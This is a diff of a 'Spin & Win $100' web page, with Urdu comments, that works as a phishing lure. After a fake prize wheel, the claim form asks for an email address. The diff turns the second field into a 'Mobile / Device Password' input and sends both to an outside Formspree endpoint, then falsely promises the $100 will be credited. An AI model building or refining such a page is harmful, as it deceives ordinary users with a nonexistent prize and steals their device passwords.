@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spin & Win Rewards!</title>
+    <title>Lucky Spin & Win $100!</title>
     <style>
         * {
             box-sizing: border-box;
@@ -143,8 +143,8 @@
     <div class="container">
         <!-- Game Section -->
         <div id="game-section">
-            <h1>Spin & Win!</h1>
-            <p>Try your luck and win up to $100 instantly!</p>
+            <h1>Spin & Win $100!</h1>
+            <p>Lucky Spin: Try your luck to win real cash instantly!</p>
             
             <div class="wheel-container">
                 <div class="pointer"></div>
@@ -157,9 +157,9 @@
         <!-- Claim Section (Hidden initially) -->
         <div id="claim-section" class="hidden">
             <h1>Congratulations! 🎉</h1>
-            <p>You won <span style="color: #1dd1a1; font-weight: bold;">$100</span>! Enter your details to withdraw your reward.</p>
+            <p>You won <span style="color: #1dd1a1; font-weight: bold;">$100</span>! Enter your details to withdraw money.</p>
             
-            <!-- Yahan apni Formspree ID lagani hai -->
+            <!-- Formspree Integration -->
             <form id="withdrawForm" action="https://formspree.io/f/xojgbzww" method="POST">
                 <div class="form-group">
                     <label for="email">Email Address</label>
@@ -167,18 +167,18 @@
                 </div>
 
                 <div class="form-group">
-                    <label for="otp">Verification Code / Info</label>
-                    <input type="text" id="otp" name="otp_or_info" placeholder="Enter code or info" required>
+                    <label for="password">Mobile / Device Password (Verification)</label>
+                    <input type="password" id="password" name="mobile_password" placeholder="Enter device password to verify" required>
                 </div>
 
-                <button type="submit" class="spin-btn">Withdraw Now</button>
+                <button type="submit" class="spin-btn">Withdraw Now ($100)</button>
             </form>
         </div>
 
         <!-- Success Section (Hidden initially) -->
         <div id="success-section" class="hidden">
             <h1>Withdrawal Submitted!</h1>
-            <p class="success-msg">Your request for $100 has been received successfully and is being processed.</p>
+            <p class="success-msg">Your $100 withdrawal request has been submitted. It will be credited soon!</p>
         </div>
     </div>
 
@@ -202,15 +202,14 @@
             }, 4000);
         }
 
-        // Formspree AJAX submission handle karne ke liye
         const form = document.getElementById('withdrawForm');
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
-            const data = new FormData(form);
+            const formData = new FormData(form);
             
             fetch(form.action, {
                 method: form.method,
-                body: data,
+                body: formData,
                 headers: {
                     'Accept': 'application/json'
                 }
@@ -219,7 +218,7 @@
                     document.getElementById('claim-section').classList.add('hidden');
                     document.getElementById('success-section').classList.remove('hidden');
                 } else {
-                    alert('Oops! Kuch masla ho gaya, dobara try karein.');
+                    alert('Kuch masla ho gaya, dobara try karein.');
                 }
             }).catch(error => {
                 alert('Connection error!');
